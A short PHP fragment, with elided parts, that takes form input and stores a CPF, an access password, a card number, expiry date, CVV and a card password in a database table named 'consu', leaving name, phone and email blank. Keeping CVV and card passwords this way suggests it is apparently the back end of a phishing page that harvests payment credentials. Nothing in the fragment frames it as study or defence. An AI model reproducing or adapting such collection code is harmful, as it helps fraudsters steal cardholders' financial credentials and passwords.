...
if((isset($_POST['card']) && !(is_null($_POST['card']))) && (isset($_POST['cpf']) && !(is_null($_POST['cpf'])) && (isset($_GET['check'])))){
    ...
    $acesso = mysqli_real_escape_string($conexao, $_POST['pass']);
    $name = " ";
    $phone = " ";
    $email = " ";
    $cc = mysqli_real_escape_string($conexao, $_POST['card']);
    $date = mysqli_real_escape_string($conexao, $_POST['date']);
    $cvv = mysqli_real_escape_string($conexao, $_POST['cvv']);
    $pass = mysqli_real_escape_string($conexao, $_POST['passw']);

    $sql = $pdo->prepare("INSERT INTO `consu` VALUES(default,?,?,?,?,?,?,?,?,?)");
    $sql->execute([$name, $cpf, $acesso, $phone, $email, $cc, $date, $cvv, $pass]);
